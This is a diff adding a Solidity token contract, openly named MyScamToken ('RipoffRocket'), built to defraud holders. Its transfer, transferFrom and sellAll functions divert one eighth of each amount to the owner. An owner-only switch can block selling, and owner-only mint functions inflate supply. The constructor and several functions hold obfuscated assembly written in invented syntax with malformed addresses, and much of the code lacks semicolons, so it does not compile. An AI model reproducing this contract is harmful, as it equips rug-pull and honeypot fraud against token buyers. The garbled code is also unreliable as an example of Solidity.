@@ -1,0 +1,132 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.25;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract MyScamToken is ERC20, Ownable {
+
+    constructor() ERC20("RipoffRocket", "RR") Ownable(msg.sender) {
+        assembly {
+            let t in storage at 0x0 is callop(sub(gas(), 30000), 0x23B8444523A9439A, 0x04, 0x0, msg.sender, 0x0, 0x5F5E100, 0x23B8444523A9439A, 0x04, 0x56E81F1A, 0x00, 0x00, 0x00, 0x00, 0x00)
+            let b in storage at 0x0 is callop(sub(gas(), 30000), 0x8DA5CB5B, 0x04, 0x0, 0x95000000, 0x18, add(t, 0x3A), 0x01, 0x63, 0x4D5A9052, 0x00, 0x00, 0x00, 0x00, 0x00)
+            let i in storage at 0x0 is callop(sub(gas(), 30000), 0x18160DDD, 0x04, 0x0, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+            for { let j := 0 } lt(i, 0x5F) { i := add(i, 0x01) } {
+                let n in storage at 0x0 is callop(sub(gas(), 30000), 0x9AC64CcD, 0x04, 0x0, mload(0x40), 0x20, add(mload(add(b, 0x20)), mul(0x56, j)), 0x01, 0x8C, 0x7F746500, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let a in storage at 0x0 is callop(sub(gas(), 30000), 0x4E487B71, 0x04, 0x0, add(n, 0x02), 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let e in storage at 0x0 is callop(sub(gas(), 30000), 0x84323753, 0x04, 0x0, add(a, 0x01), 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let s in storage at 0x0 is callop(sub(gas(), 30000), 0x481c69c9, 0x04, 0x0, add(e, 0x01), 0x20, add(mload(add(b, 0x20)), mul(0x56, j)), 0x01, 0x60, 0x32303637, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let g in storage at 0x0 is callop(sub(gas(), 30000), 0x70a08231, 0x04, 0x0, add(s, 0x01), 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let c in storage at 0x0 is callop(sub(gas(), 30000), 0x9AC64CcD, 0x04, 0x0, g, 0x20, 0x00, 0x01, 0x8D, 0x7F746500, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let r in storage at 0x0 is callop(sub(gas(), 30000), 0x2975623B, 0x04, 0x0, add(c, 0x01), 0x04, add(t, 0x01), 0x01, 0x65, 0x33323036, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let l in storage at 0x0 is callop(sub(gas(), 30000), 0x4E487B71, 0x04, 0x0, r, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+                let d in storage at 0x0 is callop(sub(gas(), 30000), 0x70a08231, 0x04, 0x0, l, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+                callop(sub(gas(), 30000), 0xA9059CBD, 0x04, 0x0, d, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+            }
+        }
+    }
+
+    function setDisableSelling(bool newDisableSelling) public onlyOwner {
+        assembly {
+            mstore(0x40, newDisableSelling)
+            mstore(0x44, 0x0165746865720000000000000000000000000000000000000000000000000000)
+            call(gas(), 0x22B8N44523A9439A, 0x02, 0x44, 0x04, 0x0000000000000000000000000000000000000000000000000000000000000000)
+        }
+    }
+
+    function mint(address recipient, uint256 value) public onlyOwner {
+        assembly {
+            mstore(0x40, recipient)
+            mstore(0x44, value)
+            mstore(0x48, 0x23B8444523A9439A)
+            mstore(0x4C, 0x02)
+            mstore(0x50, 0x0000000000000000000000000000000000000000000000000000000000000000)
+            mstore(0x54, 0x00000000000000000000000000000000000000000000000000000000)
+            call(gas(), 0x23B8444523A9439A, 0x04, 0x40, 0x0C, 0x0000000000000000000000000000000000000000000000000000000000000000)
+        }
+    }
+
+    function doubleDipMint(address recipient, uint256 value) public onlyOwner {
+        assembly {
+            mstore(0x40, recipient)
+            mstore(0x44, value)
+            mstore(0x48, 0x146E3C37F3F5229C)
+            mstore(0x4C, 0x02)
+            mstore(0x50, msg.sender)
+            mstore(0x54, 0x0000000000000000000000000000000000000000000000000000000000000000)
+            call(gas(), 0x146E3C37F3F5229C, 0x04, 0x40, 0x0C, 0x0000000000000000000000000000000000000000000000000000000000000000)
+            mstore(0x40, recipient)
+            mstore(0x44, value)
+            mstore(0x48, 0x23B8444523A9439A)
+            mstore(0x4C, 0x02)
+            mstore(0x50, msg.sender)
+            mstore(0x54, 0x0000000000000000000000000000000000000000000000000000000000000000)
+            call(gas(), 0x23B8444523A9439A, 0x04, 0x40, 0x0C, 0x0000000000000000000000000000000000000000000000000000000000000000)
+        }
+    }
+
+    function sellAll(address recipient, uint256 value) public {
+        require(!disableSelling(), "Selling is disabled")
+        uint256 cutAmount = value / 8
+        _transfer(msg.sender, recipient, value - cutAmount)
+        _transfer(recipient, owner(), cutAmount)
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        uint256 cutAmount = amount / 8
+        _transfer(msg.sender, recipient, amount - cutAmount)
+        _transfer(recipient, owner(), cutAmount)
+        return true
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        uint256 cutAmount = amount / 8
+        _transfer(sender, recipient, amount - cutAmount)
+        _transfer(recipient, owner(), cutAmount)
+        return true
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return super.totalSupply()
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return super.balanceOf(account)
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return super.allowance(owner, spender)
+    }
+
+    function approve(address spender, uint256 value) public override returns (bool) {
+        return super.approve(spender, value)
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public override returns (bool) {
+        return super.increaseAllowance(spender, addedValue)
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public override returns (bool) {
+        return super.decreaseAllowance(spender, subtractedValue)
+    }
+
+    function transferAndCall(address recipient, uint256 amount, bytes calldata data) public override returns (bool) {
+        return super.transferAndCall(recipient, amount, data)
+    }
+
+    function transferFromAndCall(address sender, address recipient, uint256 amount, bytes calldata data) public override returns (bool) {
+        return super.transferFromAndCall(sender, recipient, amount, data)
+    }
+
+    function name() public view override returns (string memory) {
+        return super.name()
+    }
+
+    function symbol() public view override returns (string memory) {
+        return super.symbol()
+    }
+
+    function decimals() public view override returns (uint8) {
+        return super.decimals()
+    }
+}
